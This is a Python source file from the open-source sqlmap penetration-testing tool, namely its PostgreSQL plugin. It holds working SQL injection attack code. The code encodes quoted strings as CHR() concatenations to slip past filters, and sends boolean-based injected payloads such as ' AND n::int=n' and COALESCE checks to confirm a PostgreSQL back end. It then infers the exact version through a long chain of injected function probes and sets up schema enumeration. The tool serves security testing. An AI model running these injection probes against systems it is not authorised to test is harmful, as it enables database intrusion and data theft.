#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2006-2008 Bernardo Damele A. G. <bernardo.damele@gmail.com>
                        and Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""



import re

from lib.core.agent import agent
from lib.core.common import formatDBMSfp
from lib.core.common import formatFingerprint
from lib.core.common import getHtmlErrorFp
from lib.core.common import randomInt
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapSyntaxException
from lib.core.session import setDbms
from lib.core.settings import PGSQL_ALIASES
from lib.core.settings import PGSQL_SYSTEM_DBS
from lib.core.unescaper import unescaper
from lib.request import inject
from lib.request.connect import Connect as Request

from plugins.generic.enumeration import Enumeration
from plugins.generic.filesystem import Filesystem
from plugins.generic.fingerprint import Fingerprint
from plugins.generic.takeover import Takeover


class PostgreSQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
    """
    This class defines PostgreSQL methods
    """

    def __init__(self):
        self.excludeDbsList = PGSQL_SYSTEM_DBS
        Enumeration.__init__(self, "PostgreSQL")

        unescaper.setUnescape(PostgreSQLMap.unescape)


    @staticmethod
    def unescape(expression, quote=True):
        if quote:
            while True:
                index = expression.find("'")
                if index == -1:
                    break

                firstIndex = index + 1
                index = expression[firstIndex:].find("'")

                if index == -1:
                    raise sqlmapSyntaxException, "Unenclosed ' in '%s'" % expression

                lastIndex = firstIndex + index
                old = "'%s'" % expression[firstIndex:lastIndex]
                #unescaped = "("
                unescaped = ""

                for i in range(firstIndex, lastIndex):
                    unescaped += "CHR(%d)" % (ord(expression[i]))
                    if i < lastIndex - 1:
                        unescaped += "||"

                #unescaped += ")"
                expression = expression.replace(old, unescaped)
        else:
            expression = "||".join("CHR(%d)" % ord(c) for c in expression)

        return expression


    @staticmethod
    def escape(expression):
        while True:
            index = expression.find("CHR(")
            if index == -1:
                break

            firstIndex = index
            index = expression[firstIndex:].find("))")

            if index == -1:
                raise sqlmapSyntaxException, "Unenclosed ) in '%s'" % expression

            lastIndex = firstIndex + index + 1
            old = expression[firstIndex:lastIndex]
            oldUpper = old.upper()
            oldUpper = oldUpper.replace("CHR(", "").replace(")", "")
            oldUpper = oldUpper.split("||")

            escaped = "'%s'" % "".join([chr(int(char)) for char in oldUpper])
            expression = expression.replace(old, escaped)

        return expression


    def getFingerprint(self):
        value  = ""
        wsOsFp = formatFingerprint("web server", kb.headersFp)

        if wsOsFp:
            value += "%s\n" % wsOsFp

        if self.banner:
            dbmsOsFp = formatFingerprint("back-end DBMS", kb.bannerFp)

            if dbmsOsFp:
                value += "%s\n" % dbmsOsFp

        value += "back-end DBMS: "

        if not conf.extensiveFp:
            value += "PostgreSQL"
            return value

        actVer      = formatDBMSfp()
        blank       = " " * 15
        value      += "active fingerprint: %s" % actVer

        if kb.bannerFp:
            banVer = kb.bannerFp["dbmsVersion"]
            banVer = formatDBMSfp([banVer])
            value += "\n%sbanner parsing fingerprint: %s" % (blank, banVer)

        htmlErrorFp = getHtmlErrorFp()

        if htmlErrorFp:
            value += "\n%shtml error message fingerprint: %s" % (blank, htmlErrorFp)

        return value


    def checkDbms(self):
        """
        Reference for fingerprint: http://www.postgresql.org/docs/8.3/interactive/release-8-3.html
        """

        if conf.dbms in PGSQL_ALIASES:
            setDbms("PostgreSQL")

            self.getPrematureBanner("VERSION()")

            if not conf.extensiveFp:
                return True

        logMsg = "testing PostgreSQL"
        logger.info(logMsg)

        randInt = str(randomInt(1))

        payload = agent.fullPayload(" AND %s::int=%s" % (randInt, randInt))
        result  = Request.queryPage(payload)

        if result == True:
            logMsg = "confirming PostgreSQL"
            logger.info(logMsg)

            payload = agent.fullPayload(" AND COALESCE(%s, NULL)=%s" % (randInt, randInt))
            result  = Request.queryPage(payload)

            if result != True:
                warnMsg = "the back-end DMBS is not PostgreSQL"
                logger.warn(warnMsg)

                return False

            setDbms("PostgreSQL")

            self.getPrematureBanner("VERSION()")

            if not conf.extensiveFp:
                return True

            transTimeCasted = inject.getValue("SUBSTR(TRANSACTION_TIMESTAMP()::text, 1, 1)") in ( "1", "2" )
            transTime       = inject.getValue("SUBSTR(TRANSACTION_TIMESTAMP(), 1, 1)") in ( "1", "2" )

            if transTimeCasted and not transTime:
                kb.dbmsVersion = [">= 8.3.0"]
            elif transTime:
                kb.dbmsVersion = [">= 8.2.0", "< 8.3.0"]
            elif inject.getValue("GREATEST(5, 9, 1)") == "9":
                kb.dbmsVersion = [">= 8.1.0", "< 8.2.0"]
            elif inject.getValue("WIDTH_BUCKET(5.35, 0.024, 10.06, 5)") == "3":
                kb.dbmsVersion = [">= 8.0.0", "< 8.1.0"]
            elif inject.getValue("SUBSTR(MD5('sqlmap'), 1, 1)"):
                kb.dbmsVersion = [">= 7.4.0", "< 8.0.0"]
            elif inject.getValue("SUBSTR(CURRENT_SCHEMA(), 1, 1)") == "p":
                kb.dbmsVersion = [">= 7.3.0", "< 7.4.0"]
            elif inject.getValue("BIT_LENGTH(1)") == "8":
                kb.dbmsVersion = [">= 7.2.0", "< 7.3.0"]
            elif inject.getValue("SUBSTR(QUOTE_LITERAL('a'), 2, 1)") == "a":
                kb.dbmsVersion = [">= 7.1.0", "< 7.2.0"]
            elif inject.getValue("POW(2, 3)") == "8":
                kb.dbmsVersion = [">= 7.0.0", "< 7.1.0"]
            elif inject.getValue("MAX('a')") == "a":
                kb.dbmsVersion = [">= 6.5.0", "< 6.5.3"]
            elif re.search("([\d\.]+)", inject.getValue("SUBSTR(VERSION(), 12, 5)")):
                kb.dbmsVersion = [">= 6.4.0", "< 6.5.0"]
            elif inject.getValue("SUBSTR(CURRENT_DATE, 1, 1)") == "2":
                kb.dbmsVersion = [">= 6.3.0", "< 6.4.0"]
            elif inject.getValue("SUBSTRING('sqlmap', 1, 1)") == "s":
                kb.dbmsVersion = [">= 6.2.0", "< 6.3.0"]
            else:
                kb.dbmsVersion = ["< 6.2.0"]

            return True
        else:
            warnMsg = "the back-end DMBS is not PostgreSQL"
            logger.warn(warnMsg)

            return False


    def forceDbmsEnum(self):
        if conf.db not in PGSQL_SYSTEM_DBS and conf.db != "public":
            conf.db = "public"

            warnMsg  = "on PostgreSQL it is only possible to enumerate "
            warnMsg += "on the current schema and on system databases, "
            warnMsg += "sqlmap is going to use 'public' schema as "
            warnMsg += "database name"
            logger.warn(warnMsg)
